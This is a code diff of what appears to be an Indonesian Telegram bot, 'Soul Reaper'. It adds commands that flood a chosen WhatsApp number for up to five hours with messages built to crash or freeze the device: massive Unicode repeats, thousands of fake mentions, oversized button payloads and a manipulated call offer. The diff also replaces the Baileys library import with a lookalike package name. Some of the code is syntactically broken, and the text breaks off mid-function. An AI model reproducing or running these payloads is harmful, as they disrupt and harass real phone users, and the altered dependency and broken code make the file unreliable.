@@ -75,7 +75,7 @@ const {
         templateMessage,
         InteractiveMessage,
         Header
-} = require('@whiskeysockets/baileys');
+} = require('@whiskeybydaahets/baileys');
 const pino = require('pino');
 const chalk = require('chalk');
 const axios = require('axios');
@@ -1335,6 +1335,196 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async ctx => {
                 while (Date.now() < endTime) {
                         if (!isWhatsAppConnected) break;
                         await AboutYou(target);
+                        
+                        await sleep(3000);
+                }
+                await donerespone(target, ctx);
+        };
+        runAttack();
+});
+bot.command("xandro2", checkWhatsAppConnection, checkPremium, async ctx => {
+        await ctx.telegram.sendChatAction(ctx.chat.id, 'record_audio');
+        const userId = ctx.from.id;
+        const cooldownStatus = checkCooldown(userId);
+        if (!cooldownStatus.canAttack) {
+                return await ctx.reply(`
+╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
+│
+│ • Status: Masih Cooldown ⏳
+│ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
+│
+╰═════════════════════⊱`);
+        }
+        const args = ctx.message.text.split(/\s+/);
+        if (args.length < 3) {
+                return await ctx.reply(`
+╭═══════⟨ 𝐂𝐚??𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
+│
+│ • /xandro 628xxx 1m   (1 menit)
+│ • /xandro 628xxx 1j   (1 jam)
+│
+├─────『 𝐈𝐧𝐟𝐨 』
+│ • Support 0/62/+62
+│ • Max durasi: 5 jam (5j)
+│ • Jeda per pesan: 3 detik
+│
+╰═════════════════════⊱`, {
+                        reply_to_message_id: ctx.message.message_id
+                });
+        }
+        const nomorHP = args[1];
+        const durationInput = args[2].toLowerCase();
+        let durationMs = 0;
+        if (durationInput.endsWith('m')) {
+                const minutes = parseInt(durationInput.replace('m', ''));
+                if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
+                durationMs = minutes * 60 * 1000;
+        } else if (durationInput.endsWith('j')) {
+                const hours = parseInt(durationInput.replace('j', ''));
+                if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
+                if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+                durationMs = hours * 60 * 60 * 1000;
+        } else {
+                return await ctx.reply("❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
+        }
+        const nomorFix = formatPhoneNumber(nomorHP);
+        let target = nomorFix + "@s.whatsapp.net";
+        await prosesrespone(target, ctx);
+        userLastAttack.set(userId, Date.now());
+        const runAttack = async () => {
+                const endTime = Date.now() + durationMs;
+                while (Date.now() < endTime) {
+                        if (!isWhatsAppConnected) break;
+                        await AboutYou(target);
+                        await ayaya(target);
+                        await stxcm(bydaah, target);
+                        await stxcm2(bydaah, target);
+                        await sleep(3000);
+                }
+                await donerespone(target, ctx);
+        };
+        runAttack();
+});
+bot.command("xandroblnk", checkWhatsAppConnection, checkPremium, async ctx => {
+        await ctx.telegram.sendChatAction(ctx.chat.id, 'record_audio');
+        const userId = ctx.from.id;
+        const cooldownStatus = checkCooldown(userId);
+        if (!cooldownStatus.canAttack) {
+                return await ctx.reply(`
+╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
+│
+│ • Status: Masih Cooldown ⏳
+│ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
+│
+╰═════════════════════⊱`);
+        }
+        const args = ctx.message.text.split(/\s+/);
+        if (args.length < 3) {
+                return await ctx.reply(`
+╭═══════⟨ 𝐂𝐚??𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
+│
+│ • /xandro 628xxx 1m   (1 menit)
+│ • /xandro 628xxx 1j   (1 jam)
+│
+├─────『 𝐈𝐧𝐟𝐨 』
+│ • Support 0/62/+62
+│ • Max durasi: 5 jam (5j)
+│ • Jeda per pesan: 3 detik
+│
+╰═════════════════════⊱`, {
+                        reply_to_message_id: ctx.message.message_id
+                });
+        }
+        const nomorHP = args[1];
+        const durationInput = args[2].toLowerCase();
+        let durationMs = 0;
+        if (durationInput.endsWith('m')) {
+                const minutes = parseInt(durationInput.replace('m', ''));
+                if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
+                durationMs = minutes * 60 * 1000;
+        } else if (durationInput.endsWith('j')) {
+                const hours = parseInt(durationInput.replace('j', ''));
+                if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
+                if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+                durationMs = hours * 60 * 60 * 1000;
+        } else {
+                return await ctx.reply("❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
+        }
+        const nomorFix = formatPhoneNumber(nomorHP);
+        let target = nomorFix + "@s.whatsapp.net";
+        await prosesrespone(target, ctx);
+        userLastAttack.set(userId, Date.now());
+        const runAttack = async () => {
+                const endTime = Date.now() + durationMs;
+                while (Date.now() < endTime) {
+                        if (!isWhatsAppConnected) break;
+                        await xBlank(target);
+                        await RyyBirahi(target);
+                        await sleep(3000);
+                }
+                await donerespone(target, ctx);
+        };
+        runAttack();
+});
+bot.command("combo", checkWhatsAppConnection, checkPremium, async ctx => {
+        await ctx.telegram.sendChatAction(ctx.chat.id, 'record_audio');
+        const userId = ctx.from.id;
+        const cooldownStatus = checkCooldown(userId);
+        if (!cooldownStatus.canAttack) {
+                return await ctx.reply(`
+╭═══════『 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 』═══════⊱
+│
+│ • Status: Masih Cooldown ⏳
+│ • Tunggu: ${cooldownStatus.remainingTime} detik lagi
+│
+╰═════════════════════⊱`);
+        }
+        const args = ctx.message.text.split(/\s+/);
+        if (args.length < 3) {
+                return await ctx.reply(`
+╭═══════⟨ 𝐂𝐚??𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
+│
+│ • /xandro 628xxx 1m   (1 menit)
+│ • /xandro 628xxx 1j   (1 jam)
+│
+├─────『 𝐈𝐧𝐟𝐨 』
+│ • Support 0/62/+62
+│ • Max durasi: 5 jam (5j)
+│ • Jeda per pesan: 3 detik
+│
+╰═════════════════════⊱`, {
+                        reply_to_message_id: ctx.message.message_id
+                });
+        }
+        const nomorHP = args[1];
+        const durationInput = args[2].toLowerCase();
+        let durationMs = 0;
+        if (durationInput.endsWith('m')) {
+                const minutes = parseInt(durationInput.replace('m', ''));
+                if (isNaN(minutes) || minutes < 1) return await ctx.reply("❌ Menit tidak valid!");
+                durationMs = minutes * 60 * 1000;
+        } else if (durationInput.endsWith('j')) {
+                const hours = parseInt(durationInput.replace('j', ''));
+                if (isNaN(hours) || hours < 1) return await ctx.reply("❌ Jam tidak valid!");
+                if (hours > 5) return await ctx.reply("❌ Maksimal durasi adalah 5 jam!");
+                durationMs = hours * 60 * 60 * 1000;
+        } else {
+                return await ctx.reply("❌ Format waktu salah! Gunakan 'm' untuk menit atau 'j' untuk jam (contoh: 1m atau 1j)");
+        }
+        const nomorFix = formatPhoneNumber(nomorHP);
+        let target = nomorFix + "@s.whatsapp.net";
+        await prosesrespone(target, ctx);
+        userLastAttack.set(userId, Date.now());
+        const runAttack = async () => {
+                const endTime = Date.now() + durationMs;
+                while (Date.now() < endTime) {
+                        if (!isWhatsAppConnected) break;
+                        await AboutYou(target);
+                        await ayaya(target);
+                        await xBlank(target);
+                        await RyyBirahi(target);
+                        await stxcm(bydaah, target);
+                        await stxcm2(bydaah, target);
                         await sleep(3000);
                 }
                 await donerespone(target, ctx);
@@ -1384,7 +1574,7 @@ bot.start(async (ctx) => {
 bot.action('soultampleng', async (ctx) => {
         ctx.answerCbQuery();
         const menu = `
-╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
+╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐??𝓔𝓡  𓇼 ⟩━━━━━━━╮
 │
 │◈ /addadmin  »  System Admin Control
 │◈ /deladmin  »  Remove Admin Access  
@@ -1442,15 +1632,10 @@ bot.action('bugmen', async (ctx) => {
 ╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
 │
 ├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
-│ • /xandro ⚡
-│   ├ Tipe: Fc All andro( Not Prema)
-│   ├ Target: All Android
-│   └ Status: Perfect Hit ✅
-│
-│ • /soulz 🔥 
-│   ├ Tipe: Fc All andro( Not Prema)
-│   ├ Target: Android Latest
-│   └ Status: Working ✅
+│ • /xandro ⚡(FC)
+│ • /xandro2 ⚡(DELAY)
+│ • /xandroblnk⚡(BLANK)
+│ • /combo ⚡(DELAY +FC)
 │
 ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
 │ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
@@ -1491,10 +1676,10 @@ bot.command('bugmen', async (ctx) => {
 ╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
 │
 ├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
-│ • /xandro ⚡
-│   ├ Tipe: Fc All andro( Not Prema)
-│   ├ Target: All Android
-│   └ Status: Perfect Hit ✅
+│ • /xandro ⚡(FC)
+│ • /xandro2 ⚡(DELAY)
+│ • /xandroblnk⚡(BLANK)
+│ • /combo ⚡(DELAY +FC)
 │
 ├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
 │ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
@@ -1543,6 +1728,7 @@ async function clearChat(target) {
                 console.error("Gagal menghapus chat:", error);
         }
 }
+//ALLFUNC NO AMPAS
 async function AboutYou(target, ptcp = true) {
     for (let i = 0; i < 888; i++) {
         try {
@@ -1619,6 +1805,773 @@ async function AboutYou(target, ptcp = true) {
         } catch (error) {}
     }
 }
+
+async function ayaya(bydaah, target) {
+for (let i = 0; i < 555; i++) {
+  try {
+    const abimsalsa = "\u2063".repeat(5000);
+    const salsa = "\u300B".repeat(3000);
+    const msg1 = {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "./$",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: "\x10".repeat(1045000),
+              version: 3
+            }
+          }
+        }
+      }
+    };
+
+    const msg2 = {  
+      stickerMessage: {  
+        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
+        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
+        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
+        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
+        mimetype: "image/webp",  
+        height: 9999,  
+        width: 9999,  
+        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
+        fileLength: 12260,  
+        mediaKeyTimestamp: "1743832131",  
+        isAnimated: false,  
+        stickerSentTs: "X",  
+        isAvatar: false,  
+        isAiSticker: false,  
+        isLottie: false,  
+        contextInfo: {  
+          mentionedJid: [
+            "0@s.whatsapp.net",  
+            ...Array.from({ length: 1900 }, () =>
+              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+            )  
+          ],
+          stanzaId: "1234567890ABCDEF",
+          quotedMessage: {
+            paymentInviteMessage: {
+              serviceType: 3,
+              expiryTimestamp: Date.now() + 1814400000
+            }
+          }
+        }
+      }
+    };
+
+    const msg3 = {  
+      viewOnceMessage: {  
+        message: {  
+          interactiveMessage: {  
+            body: {  
+              xternalAdReply: {  
+                title: "",  
+                text:   
+              }  
+            },  
+            extendedTextMessage: {  
+              text: "\u0000".repeat(9000),  
+              contextInfo: {  
+                mentionedJid: Array.from(
+                  { length: 2000 },
+                  (_, i) => `1${i}@s.whatsapp.net`
+                )
+              }  
+            },  
+            businessMessageForwardInfo: {  
+              businessOwnerJid: "13135550002@s.whatsapp.net"  
+            },  
+            nativeFlowMessage: {  
+              buttons: [  
+                { name: "view_product", buttonParamsJson: "\x10".repeat(5000) + salsa },  
+                { name: "address_message", buttonParamsJson: "\x20".repeat(5000) + salsa },  
+                { name: "galaxy_message", buttonParamsJson: "\10".repeat(6000) + salsa },  
+                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
+                { name: "call_permission_request", buttonParamsJson: "\x10".repeat(1065000) + salsa },  
+                { name: "single_select", buttonParamsJson: "\x!".repeat(5000) + salsa },  
+                { name: "cta_copy", buttonParamsJson: "\.!.\x.10".repeat(4000) + salsa }  
+              ],  
+              nativeFlowResponseMessage: {  
+                name: "galaxy_message",  
+                paramsJson: "meq".repeat(10),  
+                version: 3  
+              },  
+              contextInfo: {  
+                mentionedJid: [  
+                  "0@s.whatsapp.net",  
+                  ...Array.from(
+                    { length: 1900 },
+                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+                  )  
+                ]  
+              }  
+            }  
+          }  
+        }  
+      }  
+    };
+
+    for (const msg of [msg1, msg2, msg3]) {  
+      await bydaah.relayMessage("status@broadcast", msg, {  
+        messageId: undefined,  
+        statusJidList: [target],  
+        additionalNodes: [  
+          {  
+            tag: "meta",  
+            attrs: {},  
+            content: [  
+              {  
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target } }]
+              }  
+            ]  
+          }  
+        ]  
+      });  
+
+      console.log(`Wolker Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`);  
+    }
+
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+async function xBlank(target) {
+  const msg1 = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "MAU DUIT?" +
+              "ោ៝".repeat(25000) +
+              "ꦾ".repeat(25000) +
+              "@5".repeat(50000),
+            },
+            contextInfo: {
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  { length: 2000 },
+                  () =>
+                    "1" +
+                    Math.floor(Math.random() * 5000000) +
+                    "@s.whatsapp.net"
+                ),
+              ],
+              stanzaId: "123",
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 3,
+                  expiryTimestamp: Date.now() + 1814400000,
+                },
+                forwardedAiBotMessageInfo: {
+                  botName: "META AI",
+                  botJid:
+                    Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
+                  creatorName: "Bot",
+                },
+              },
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamJson: JSON.stringify({
+                    status: true,
+                  })
+                },
+                {
+                  name: "mpm",
+                  buttonParamJson: JSON.stringify({
+                    status: true,
+                  })
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+  
+  const msg2 = generateWAMessageFromContent(target, {
+    viewOnceMessageV2: {
+      message: {
+        listResponseMessage: {
+          title: "⌁⃰MAU DUIT?" + "ꦾ".repeat(5000),
+          listType: 4,
+          buttonText: { displayText: "🩸" },
+          sections: [],
+          singleSelectReply: {
+            selectedRowId: "⌜⌟"
+          },
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            remoteJid: "who Is Ryy?",
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 1,
+                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
+              }
+            },
+            externalAdReply: {
+              title: "☀️",
+              body: "🩸",
+              mediaType: 1,
+              renderLargerThumbnail: false,
+              nativeFlowButtons: [
+                {
+                  name: "payment_info",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: "",
+                },
+              ],
+            },
+            extendedTextMessage: {
+            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
+            contextInfo: {
+              stanzaId: target,
+              participant: target,
+              quotedMessage: {
+                conversation:
+                  "⌁⃰PLER" +
+                  "ꦾ࣯࣯".repeat(50000) +
+                  "@1".repeat(20000),
+              },
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING",
+              },
+            },
+            inviteLinkGroupTypeV2: "DEFAULT",
+          },
+           participant: target, 
+          }
+        }
+      }
+    }
+  }, {});
+  
+  const msg3 = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: { 
+            header: {
+              title: "ꦾ࣯࣯".repeat(50000),
+              locationMessage: {
+                degreesLatitude: 0,
+                degreesLongitude: 0,
+              },
+              hasMediaAttachment: true,
+            },
+            body: {
+              text: "MAU DUIT?" +
+              "ោ៝".repeat(25000) +
+              "ꦾ".repeat(25000) +
+              "@5".repeat(50000),
+             },
+             nativeFlowMessage: {
+               messageParamJson: "{[".repeat(50000),
+               buttons: [
+                 { name: "cta_call",
+                 buttonParamsJson: JSON.stringify({ status: true }) },
+                { name: "cta_copy",    
+                buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
+               { name: "quick_reply", 
+               buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) },
+               ],
+             },
+           },
+         },
+       },
+     },
+     {}
+  );
+  
+  await bydaah.relayMessage(target, msg1.message, {
+    messageId: msg1.key.id,
+    participant: { jid: target },
+  });
+  
+  await bydaah.relayMessage(target, msg2.message, {
+    messageId: msg2.key.id,
+    participant: { jid: target },
+  });
+  
+  await bydaah.relayMessage(target, msg3.message, {
+    participant: { jid: target },
+    messageId: msg3.key.id,
+  });
+}
+
+async function RyyBirahi(target) {
+    const mentionedList = [
+        "13135550002@s.whatsapp.net",
+        target,
+        ...Array.from({ length: 30000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+
+    try {
+        for (let i = 0; i < 15; i++) { 
+            const message = {
+                botInvokeMessage: {
+                    message: {
+                        newsletterAdminInviteMessage: {
+                            newsletterJid: '666@newsletter',
+                            newsletterName: "ꦾ".repeat(60000),
+                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
+                            caption: "ꦾ".repeat(90000),
+                            inviteExpiration: Date.now() + 0x99999999999abcdef,
+                        },
+                    },
+                },
+                nativeFlowMessage: {
+                    messageParamsJson: "[{".repeat(10000),
+                    buttons: [
+                        {
+                            name: "mpm",
+                            buttonParamsJson: "\x10".repeat(808808)
+                        },
+                        {
+                            name: "single_select",
+                            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
+                        },
+                        {
+                            name: "galaxy_message",
+                            buttonParamsJson: JSON.stringify({ status: "1" })
+                        },
+                        {
+                            name: "call_permission_request",
+                            buttonParamsJson: "[{".repeat(808808)
+                        }
+                    ]
+                },
+                contextInfo: {
+                    remoteJid: target,
+                    participant: target,
+                    mentionedJid: mentionedList,
+                    stanzaId: bydaah.generateMessageTag(),
+                    businessMessageForwardInfo: {
+                        businessOwnerJid: "13135550002@s.whatsapp.net"
+                    },
+                },
+            };
+
+            await bydaah.relayMessage(target, message, {
+                userJid: target,
+            });
+        }
+    } catch (error) {
+        console.log("error:\n" + error);
+    }
+}
+
+async function stxcm(bydaah, target) {
+    try {
+        const interactivePayload = {
+            interactiveMessage: {
+                header: {
+                    hasMediaAttachment: true,
+                    jpegThumbnail: null
+                },
+                contextInfo: {
+                    participant: "0@s.whatsapp.net",
+                    remoteJid: "status@broadcast",
+                    conversionSource: "porn",
+                    conversionData: crypto.randomBytes(16),
+                    conversionDelaySeconds: 9999,
+                    forwardingScore: 999999,
+                    isForwarded: true,
+                    quotedAd: {
+                        advertiserName: "StX-Revolution ðŸ‘¾",
+                        mediaType: "IMAGE",
+                        jpegThumbnail: null,
+                        caption: "SOLO EXPOSED"
+                    },
+                    placeholderKey: {
+                        remoteJid: "0@s.whatsapp.net",
+                        fromMe: false,
+                        id: "ABCDEF1234567890"
+                    },
+                    expiration: -99999,
+                    ephemeralSettingTimestamp: Date.now(),
+                    ephemeralSharedSecret: crypto.randomBytes(16),
+                    entryPointConversionSource: "WhatsaApp",
+                    entryPointConversionApp: "WhatsApp",
+                    actionLink: {
+                        url: "t.me/PipopOfficial",
+                        buttonTitle: "action_button"
+                    },
+                    disappearingMode: {
+                        initiator: 1,
+                        trigger: 2,
+                        initiatorDeviceJid: target,
+                        initiatedByMe: true
+                    },
+                    groupSubject: "Jeneng Ku Pipop",
+                    parentGroupJid: "120363370626418572@g.us",
+                    trustBannerType: "X",
+                    trustBannerAction: 99999,
+                    isSampled: true,
+                    externalAdReply: {
+                        title: "Jeneng Ku Pipop",
+                        mediaType: 2,
+                        renderLargerThumbnail: false,
+                        showAdAttribution: false,
+                        containsAutoReply: false,
+                        body: "Â© S-3Xecution",
+                        thumbnail: null,
+                        sourceUrl: "t.me/PipopOfficial",
+                        sourceId: "9T7A4M1A",
+                        ctwaClid: "ctwaClid",
+                        ref: "ref",
+                        clickToWhatsappCall: true,
+                        ctaPayload: "ctaPayload",
+                        disableNudge: true,
+                        originalImageUrl: null
+                    },
+                    featureEligibilities: {
+                        cannotBeReactedTo: true,
+                        cannotBeRanked: true,
+                        canRequestFeedback: true
+                    },
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: "120363321780343299@newsletter",
+                        serverMessageId: 1,
+                        newsletterName: `Jeneng Ku Pipop ${"ê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆ".repeat(10)}`,
+                        contentType: 3,
+                        accessibilityText: "Jeneng Ku Pipop"
+                    },
+                    statusAttributionType: 2,
+                    utm: {
+                        utmSource: "Jeneng Ku Pipop",
+                        utmCampaign: "Jeneng Ku Pipop"
+                    }
+                },
+                body: {
+                    text: "Jeneng Ku Pipop"
+                },
+                nativeFlowMessage: {
+                    buttons: [{
+                        name: "payment_method",
+                        buttonParamsJson: `{}`
+                    }]
+                }
+            }
+        };
+
+        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
+        await bydaah.relayMessage(target, msg1.message, { messageId: msg1.key.id });
+
+        const paymentPayload = {
+            requestPaymentMessage: {
+                currencyCodeIso4217: 'USD',
+                requestFrom: target,
+                expiryTimestamp: null,
+                contextInfo: {
+                    remoteJid: " S ",
+                    isForwarded: true,
+                    forwardingScore: 979,
+                    externalAdReply: {
+                        title: "Jeneng Ku Pipop",
+                        body: "Jeneng Ku Pipop",
+                        mediaType: "VIDEO",
+                        renderLargerThumbnail: true,
+                        previewType: "VIDEO",
+                        sourceUrl: "https://t.me/PipopOfficial",
+                        mediaUrl: "https://t.me/PipopOfficial",
+                        showAdAttribution: true,
+                    }
+                }
+            }
+        };
+
+        await bydaah.relayMessage(target, paymentPayload, {
+            participant: { jid: target },
+            quoted: null,
+            userJid: null,
+            messageId: null
+        });
+
+        console.log(`Berhasil mengirim bug ke ${target}`);
+        
+    } catch (err) {
+        console.error("Gagal mengirim pesan:", err);
+    }
+}
+
+async function stxcm2(bydaah, target) {
+  try {
+    const jid = String(target).includes("@s.whatsapp.net")
+      ? String(target)
+      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;
+
+    const mapper = () => {
+      let map = {};
+      return {
+        tx(key, fn) {
+          map[key] ??= { task: Promise.resolve() };
+          map[key].task = (async (prev) => {
+            try {
+              await prev;
+            } catch {}
+            return fn();
+          })(map[key].task);
+          return map[key].task;
+        }
+      };
+    };
+
+    const lolcat = mapper();
+
+    const baffer = (buf) =>
+      Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+
+    const enc = encodeSignedDeviceIdentity;
+
+    bydaah.createParticipantNodes = async (
+      recipientJids,
+      message,
+      extraAttrs,
+      dsmMessage
+    ) => {
+      if (!recipientJids.length) {
+        return { nodes: [], shouldIncludeDeviceIdentity: false };
+      }
+
+      const patched =
+        (await bydaah.patchMessageBeforeSending?.(
+          message,
+          recipientJids
+        )) ?? message;
+
+      const stain = Array.isArray(patched)
+        ? patched
+        : recipientJids.map((recipie) => ({
+            recipientJid: recipie,
+            message: patched
+          }));
+
+      const { id: meId, lid: meLid } = bydaah.authState.creds.me;
+      const attx = meLid ? jidDecode(meLid)?.user : null;
+
+      let shouldIncludeDeviceIdentity = false;
+
+      const nodes = await Promise.all(
+        stain.map(async ({ recipientJid: recipie, message: msg }) => {
+          const { user: targetUser } = jidDecode(recipie);
+          const { user: ownUser } = jidDecode(meId);
+
+          const isOwn =
+            targetUser === ownUser || targetUser === attx;
+
+          const pient = recipie === meId || recipie === meLid;
+          if (dsmMessage && isOwn && !pient) msg = dsmMessage;
+
+          const bite = baffer(
+            enc ? enc(msg) : Buffer.from([])
+          );
+
+          return lolcat.tx(recipie, async () => {
+            const { type, ciphertext } =
+              await bydaah.signalRepository.encryptMessage({
+                jid: recipie,
+                data: bite
+              });
+
+            if (type === "pkmsg") {
+              shouldIncludeDeviceIdentity = true;
+            }
+
+            return {
+              tag: "to",
+              attrs: { jid: recipie },
+              content: [
+                {
+                  tag: "enc",
+                  attrs: { v: "2", type, ...extraAttrs },
+                  content: ciphertext
+                }
+              ]
+            };
+          });
+        })
+      );
+
+      return {
+        nodes: nodes.filter(Boolean),
+        shouldIncludeDeviceIdentity
+      };
+    };
+
+    let devices = [];
+
+    try {
+      devices = (
+        await bydaah.getUSyncDevices([jid], false, false)
+      ).map(({ user, device }) =>
+        `${user}${device ? ":" + device : ""}@s.whatsapp.net`
+      );
+    } catch {
+      devices = [jid];
+    }
+
+    try {
+      await bydaah.assertSessions(devices);
+    } catch {}
+
+    let vict = [];
+    let shouldIncludeDeviceIdentity = false;
+
+    try {
+      const created = await bydaah.createParticipantNodes(
+        devices,
+        { conversation: "y" },
+        { count: "0" }
+      );
+
+      vict = created?.nodes ?? [];
+      shouldIncludeDeviceIdentity =
+        !!created?.shouldIncludeDeviceIdentity;
+    } catch {}
+
+    const main = {
+      tag: "call",
+      attrs: {
+        to: jid,
+        id:
+          bydaah.generateMessageTag?.() ??
+          crypto.randomBytes(8).toString("hex"),
+        from:
+          bydaah.user?.id ||
+          bydaah.authState?.creds?.me?.id
+      },
+      content: [
+        {
+          tag: "offer",
+          attrs: {
+            "call-id": crypto
+              .randomBytes(16)
+              .toString("hex")
+              .slice(0, 64)
+              .toUpperCase(),
+            "call-creator":
+              bydaah.user?.id ||
+              bydaah.authState?.creds?.me?.id
+          },
+          content: [
+            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+            {
+              tag: "video",
+              attrs: {
+                orientation: "0",
+                screen_width: "1920",
+                screen_height: "1080",
+                device_orientation: "0",
+                enc: "vp8",
+                dec: "vp8"
+              }
+            },
+            { tag: "net", attrs: { medium: "3" } },
+            {
+              tag: "capability",
+              attrs: { ver: "1" },
+              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
+            },
+            { tag: "encopt", attrs: { keygen: "2" } },
+            {
+              tag: "destination",
+              attrs: {},
+              content: vict
+            }
+          ]
+        }
+      ]
+    };
+
+    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
+      try {
+        const deviceIdentity = encodeSignedDeviceIdentity(
+          bydaah.authState.creds.account,
+          true
+        );
+
+        main.content[0].content.push({
+          tag: "device-identity",
+          attrs: {},
+          content: deviceIdentity
+        });
+      } catch {}
+    }
+
+    await bydaah.relayMessage(
+      target,
+      {
+        requestPaymentMessage: {
+          currencyCodeIso4217: "USD",
+          requestFrom: target,
